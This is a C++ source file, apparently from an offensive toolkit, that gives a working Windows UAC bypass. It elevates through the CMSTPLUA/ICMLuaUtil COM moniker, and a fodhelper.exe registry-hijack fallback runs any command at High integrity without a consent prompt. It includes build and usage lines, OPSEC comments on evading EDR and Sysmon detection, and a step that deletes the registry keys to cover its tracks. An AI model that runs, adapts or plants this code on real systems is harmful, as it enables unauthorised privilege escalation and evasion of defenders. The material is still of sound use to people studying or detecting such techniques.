// uac_com_elevate.cpp - Medium -> High integrity via elevated COM moniker (ICMLuaUtil).
//
// Implements the CMSTPLUA / ICMLuaUtil::ShellExec auto-elevation UAC bypass (UACME method
// 41). Uses the "Elevation:Administrator!new:{CLSID}" moniker so COM hosts the object in
// a High-integrity dllhost.exe, then calls ShellExec to launch an arbitrary command
// elevated WITHOUT a UAC consent prompt (default UAC level). Also includes the
// fodhelper.exe registry-hijack fallback (UACME method 33) which needs no COM.
//
// NOTE: UAC is explicitly "not a security boundary" per Microsoft, but crossing the
// Medium->High integrity boundary is a core local-escalation step. Requires UAC not set
// to "Always Notify" and the calling user to be in the local Administrators group.
//
// BUILD (MSVC x64):  cl /EHsc /O2 uac_com_elevate.cpp ole32.lib oleaut32.lib advapi32.lib
// USAGE:  uac_com_elevate.exe com  "C:\\Windows\\System32\\cmd.exe /c whoami > C:\\poc.txt"
//         uac_com_elevate.exe fod  "C:\\Windows\\System32\\cmd.exe"
//
// OPSEC: COM path spawns dllhost.exe /Processid:{...}; EDR rules flag dllhost with no
// child rationale. fodhelper path writes HKCU\Software\Classes\ms-settings\...\command
// (Sysmon EID 13). Clean up the reg keys after. See references/integrity-uac-com.md.
#include <windows.h>
#include <objbase.h>
#include <cstdio>

// ICMLuaUtil interface (CMSTPLUA), vtable index 6 = ShellExec
interface ICMLuaUtil : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE Method1();
    virtual HRESULT STDMETHODCALLTYPE Method2();
    virtual HRESULT STDMETHODCALLTYPE Method3();
    virtual HRESULT STDMETHODCALLTYPE Method4();
    virtual HRESULT STDMETHODCALLTYPE Method5();
    virtual HRESULT STDMETHODCALLTYPE Method6();
    virtual HRESULT STDMETHODCALLTYPE ShellExec(LPCWSTR file, LPCWSTR params,
                                                LPCWSTR dir, ULONG fMask, ULONG nShow);
};

// CLSID_CMSTPLUA {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
static const CLSID CLSID_CMSTPLUA =
    { 0x3E5FC7F9, 0x9A51, 0x4367, {0x90,0x63,0xA1,0x20,0x24,0x4F,0xBE,0xC7} };
// IID_ICMLuaUtil {6EDD6D74-C007-4E75-B76A-E5740995E24C}
static const IID IID_ICMLuaUtil =
    { 0x6EDD6D74, 0xC007, 0x4E75, {0xB7,0x6A,0xE5,0x74,0x09,0x95,0xE2,0x4C} };

static int com_elevate(const wchar_t *cmd) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) { printf("[-] CoInitializeEx 0x%08lx\n", hr); return 1; }

    BIND_OPTS3 bo = {};
    bo.cbStruct = sizeof(bo);
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;

    // "Elevation:Administrator!new:{CLSID}" -> COM hosts in High-integrity dllhost.exe
    wchar_t moniker[256];
    swprintf(moniker, 256,
        L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}");

    ICMLuaUtil *lua = NULL;
    hr = CoGetObject(moniker, &bo, IID_ICMLuaUtil, (void **)&lua);
    if (FAILED(hr) || !lua) { printf("[-] CoGetObject 0x%08lx\n", hr); CoUninitialize(); return 1; }
    printf("[+] elevated ICMLuaUtil instance acquired\n");

    hr = lua->ShellExec(cmd, NULL, NULL, 0, SW_SHOW);
    printf(SUCCEEDED(hr) ? "[+] ShellExec dispatched elevated\n"
                         : "[-] ShellExec 0x%08lx\n", hr);
    lua->Release();
    CoUninitialize();
    return SUCCEEDED(hr) ? 0 : 1;
}

static int fodhelper_elevate(const wchar_t *cmd) {
    // fodhelper.exe is auto-elevating; it reads HKCU ms-settings shell open command.
    HKEY hk;
    const wchar_t *key = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
    if (RegCreateKeyExW(HKEY_CURRENT_USER, key, 0, NULL, 0, KEY_WRITE, NULL, &hk, NULL)) {
        printf("[-] RegCreateKeyEx failed\n"); return 1;
    }
    RegSetValueExW(hk, NULL, 0, REG_SZ, (const BYTE*)cmd,
                   (DWORD)((wcslen(cmd) + 1) * sizeof(wchar_t)));
    // DelegateExecute empty value forces the command branch
    RegSetValueExW(hk, L"DelegateExecute", 0, REG_SZ, (const BYTE*)L"", sizeof(wchar_t));
    RegCloseKey(hk);
    printf("[+] HKCU ms-settings hijack written; launching fodhelper.exe\n");

    STARTUPINFOW si = { sizeof(si) }; PROCESS_INFORMATION pi = {};
    wchar_t fod[] = L"C:\\Windows\\System32\\fodhelper.exe";
    if (!CreateProcessW(fod, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess fodhelper %lu\n", GetLastError()); return 1;
    }
    WaitForSingleObject(pi.hProcess, 4000);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);

    // Cleanup (OPSEC): remove the planted key tree.
    RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
    printf("[+] payload triggered; HKCU key tree cleaned\n");
    return 0;
}

int wmain(int argc, wchar_t **argv) {
    if (argc < 3) {
        wprintf(L"usage: %s <com|fod> <command-line>\n", argv[0]);
        return 1;
    }
    if (!wcscmp(argv[1], L"com")) return com_elevate(argv[2]);
    if (!wcscmp(argv[1], L"fod")) return fodhelper_elevate(argv[2]);
    wprintf(L"[-] unknown mode\n");
    return 1;
}
